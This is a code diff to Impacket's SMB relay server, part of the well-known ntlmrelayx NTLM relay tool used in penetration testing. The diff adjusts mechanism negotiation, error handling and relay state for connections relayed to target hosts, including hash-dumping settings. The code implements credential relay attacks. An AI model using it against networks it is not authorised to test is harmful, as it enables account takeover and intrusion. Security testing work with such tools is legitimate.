@@ -1,6 +1,6 @@
 # Impacket - Collection of Python classes for working with network protocols.
 #
-# Copyright Fortra, LLC and its affiliated companies 
+# Copyright Fortra, LLC and its affiliated companies
 #
 # All rights reserved.
 #
@@ -95,7 +95,7 @@ class SMBRelayServer(Thread):
             smbConfig.set("global", "dump_hashes", "True")
         else:
             smbConfig.set("global", "dump_hashes", "False")
-        
+
         if self.config.SMBServerChallenge is not None:
             smbConfig.set('global', 'challenge', self.config.SMBServerChallenge)
 
@@ -154,7 +154,9 @@ class SMBRelayServer(Thread):
                     self.target = self.targetprocessor.getTarget(multiRelay=False)
                 else:
                     LOG.info('(SMB): Connection from %s controlled, but there are no more targets left!' % connData['ClientIP'])
-                    return [SMB2Error()], None, STATUS_BAD_NETWORK_NAME
+                    respPacket['Status'] = STATUS_BAD_NETWORK_NAME
+                    respPacket['Data'] = SMB2Error()
+                    return None, [respPacket], STATUS_BAD_NETWORK_NAME
 
             LOG.info("(SMB): Received connection from %s, attacking target %s://%s" % (connData['ClientIP'], self.target.scheme, self.target.netloc))
 
@@ -213,8 +215,7 @@ class SMBRelayServer(Thread):
         respSMBCommand['SecurityBufferOffset'] = 0x80
 
         blob = SPNEGO_NegTokenInit()
-        blob['MechTypes'] = [TypesMech['NEGOEX - SPNEGO Extended Negotiation Security Mechanism'],
-                             TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider']]
+        blob['MechTypes'] = [TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider']]
 
 
         respSMBCommand['Buffer'] = blob.getData()
@@ -233,7 +234,7 @@ class SMBRelayServer(Thread):
         #############################################################
         # SMBRelay
         # Are we ready to relay or should we just do local auth?
-        if not self.config.disableMulti and 'relayToHost' not in connData:
+        if not self.config.disableMulti and (('relayToHost' not in connData) or not connData['relayToHost']):
             # Just call the original SessionSetup
             respCommands, respPackets, errorCode = self.origSmbSessionSetup(connId, smbServer, recvPacket)
             # We remove the Guest flag
@@ -257,8 +258,7 @@ class SMBRelayServer(Thread):
            if len(blob['MechTypes'][0]) > 0:
                # Is this GSSAPI NTLM or something else we don't support?
                mechType = blob['MechTypes'][0]
-               if mechType != TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider'] and \
-                               mechType != TypesMech['NEGOEX - SPNEGO Extended Negotiation Security Mechanism']:
+               if mechType != TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider']:
                    # Nope, do we know it?
                    if mechType in MechTypes:
                        mechStr = MechTypes[mechType]
@@ -296,17 +296,25 @@ class SMBRelayServer(Thread):
             # Let's store it in the connection data
             connData['NEGOTIATE_MESSAGE'] = negotiateMessage
 
+            client = connData.get('SMBClient')
+            if client is None:
+                LOG.error("(SMB): No relay client initialized for target %s://%s" % (self.target.scheme, self.target.netloc))
+                respSMBCommand['SecurityBufferOffset'] = 0x48
+                respSMBCommand['SecurityBufferLength'] = 0
+                respSMBCommand['Buffer'] = b''
+                smbServer.setConnectionData(connId, connData)
+                return [respSMBCommand], None, STATUS_ACCESS_DENIED
+
             #############################################################
             # SMBRelay: Ok.. So we got a NEGOTIATE_MESSAGE from a client.
             # Let's send it to the target server and send the answer back to the client.
-            client = connData['SMBClient']
             try:
                 challengeMessage = self.do_ntlm_negotiate(client, token)
+                if not challengeMessage:
+                    raise Exception('No challenge message returned from %s://%s' % (self.target.scheme, self.target.netloc))
             except Exception as e:
-                LOG.debug("(SMB): Exception:", exc_info=True)
-                # Log this target as processed for this client
+                LOG.error("(SMB): NTLM negotiate failed: %s" % str(e))
                 self.targetprocessor.registerTarget(self.target, False, self.authUser)
-                # Raise exception again to pass it on to the SMB server
                 raise
 
              #############################################################
@@ -384,7 +392,7 @@ class SMBRelayServer(Thread):
 
                 connData['Authenticated'] = True
                 if not self.config.disableMulti:
-                    del(connData['relayToHost'])
+                    connData['relayToHost'] = False
                 self.do_attack(client)
                 # Now continue with the server
             #############################################################
@@ -553,7 +561,7 @@ class SMBRelayServer(Thread):
         #############################################################
         # SMBRelay
         # Are we ready to relay or should we just do local auth?
-        if not self.config.disableMulti and 'relayToHost' not in connData:
+        if not self.config.disableMulti and (('relayToHost' not in connData) or not connData['relayToHost']):
             # Just call the original SessionSetup
             return self.origSmbSessionSetupAndX(connId, smbServer, SMBCommand, recvPacket)
         # We have confirmed we want to relay to the target host.
@@ -590,16 +598,34 @@ class SMBRelayServer(Thread):
                 # Let's store it in the connection data
                 connData['NEGOTIATE_MESSAGE'] = negotiateMessage
 
+                client = connData.get('SMBClient')
+                if client is None:
+                    packet = smb.NewSMBPacket()
+                    packet['Flags1'] = smb.SMB.FLAGS1_REPLY | smb.SMB.FLAGS1_PATHCASELESS
+                    packet['Flags2'] = smb.SMB.FLAGS2_NT_STATUS | smb.SMB.FLAGS2_EXTENDED_SECURITY
+                    packet['Command'] = recvPacket['Command']
+                    packet['Pid'] = recvPacket['Pid']
+                    packet['Tid'] = recvPacket['Tid']
+                    packet['Mid'] = recvPacket['Mid']
+                    packet['Uid'] = recvPacket['Uid']
+                    packet['Data'] = b'\x00\x00\x00'
+                    packet['ErrorCode'] = STATUS_ACCESS_DENIED >> 16
+                    packet['ErrorClass'] = STATUS_ACCESS_DENIED & 0xff
+
+                    LOG.error("(SMB): No relay client initialized for target %s://%s" % (self.target.scheme, self.target.netloc))
+                    smbServer.setConnectionData(connId, connData)
+                    return None, [packet], STATUS_ACCESS_DENIED
+
                 #############################################################
                 # SMBRelay: Ok.. So we got a NEGOTIATE_MESSAGE from a client.
                 # Let's send it to the target server and send the answer back to the client.
-                client = connData['SMBClient']
                 try:
                     challengeMessage = self.do_ntlm_negotiate(client,token)
-                except Exception:
-                    # Log this target as processed for this client
+                    if not challengeMessage:
+                        raise Exception('No challenge message returned from %s://%s' % (self.target.scheme, self.target.netloc))
+                except Exception as e:
+                    LOG.error("(SMB): NTLM negotiate failed: %s" % str(e))
                     self.targetprocessor.registerTarget(self.target, False, self.authUser)
-                    # Raise exception again to pass it on to the SMB server
                     raise
 
                 #############################################################
@@ -687,7 +713,7 @@ class SMBRelayServer(Thread):
 
                 # Done with the relay for now.
                 connData['Authenticated'] = True
-                del(connData['relayToHost'])
+                connData['relayToHost'] = False
 
                 # Status SUCCESS
                 errorCode = STATUS_SUCCESS
@@ -759,13 +785,13 @@ class SMBRelayServer(Thread):
                 # Done with the relay for now.
                 connData['Authenticated'] = True
                 if not self.config.disableMulti:
-                    del(connData['relayToHost'])
+                    connData['relayToHost'] = False
                 self.do_attack(client)
                 # Now continue with the server
             #############################################################
 
-        respData['NativeOS']     = smbServer.getServerOS()
-        respData['NativeLanMan'] = smbServer.getServerOS()
+        #respData['NativeOS']     = smbServer.getServerOS()
+        #respData['NativeLanMan'] = smbServer.getServerOS()
         respSMBCommand['Parameters'] = respParameters
         respSMBCommand['Data']       = respData
 
@@ -781,7 +807,7 @@ class SMBRelayServer(Thread):
         self.authUser = authenticateMessage.getUserString()
 
         if self.config.disableMulti:
-            return self.smbComTreeConnectAndX(connId, smbServer, SMBCommand, recvPacket)
+            return self.origsmbComTreeConnectAndX(connId, smbServer, SMBCommand, recvPacket)
         # Uncommenting this will stop at the first connection relayed and won't relaying until all targets
         # are processed. There might be a use case for this
         #if 'relayToHost' in connData:
